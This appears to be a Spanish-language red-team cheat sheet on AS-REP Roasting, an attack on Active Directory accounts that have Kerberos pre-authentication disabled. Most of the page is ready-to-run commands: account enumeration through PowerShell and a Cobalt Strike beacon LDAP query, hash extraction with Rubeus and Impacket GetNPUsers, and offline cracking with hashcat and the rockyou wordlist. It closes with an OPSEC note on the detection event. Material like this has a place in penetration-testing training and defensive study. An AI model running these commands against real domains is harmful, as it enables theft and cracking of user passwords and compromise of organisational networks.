---
tags: [ad, kerberos, asrep-roasting, hashcat]
status: done
platform: windows
---

# AS-REP Roasting

> Atacar cuentas con pre-autenticación Kerberos deshabilitada (DONT_REQUIRE_PREAUTH).

---

## Concepto

Normalmente Kerberos requiere que el cliente demuestre que conoce la contraseña antes de recibir el AS-REP (pre-autenticación). Si una cuenta tiene `DONT_REQUIRE_PREAUTH`, el DC devuelve el AS-REP a cualquiera que lo solicite, sin verificar nada. Ese AS-REP contiene datos cifrados con la contraseña del usuario → crackeable offline.

---

## Enumeración

```powershell
# Buscar cuentas con DONT_REQUIRE_PREAUTH
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Via ldapsearch BOF
beacon> ldapsearch "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes sAMAccountName
```

---

## Explotación

### Windows — Rubeus
```
# Usuarios específicos
Rubeus.exe asreproast /user:victima /nowrap /outfile:asrep.txt

# Todos los usuarios vulnerables
Rubeus.exe asreproast /nowrap /outfile:asrep.txt
```

### Linux — Impacket
```bash
# Sin credenciales (solo conociendo usernames)
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10

# Con credenciales (enumera y extrae)
GetNPUsers.py corp.local/usuario:password -dc-ip 10.10.10.10 -request
```

---

## Cracking

```bash
# Hashcat — modo 18200 (AS-REP etype 23)
hashcat -a 0 -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## OPSEC

> AS-REP Roasting genera AS-REQ sin pre-auth al DC — evento 4768 con Pre-Authentication-Type = 0.
> Menos ruidoso que Kerberoasting (no requiere autenticación previa), pero aun así es detectable.

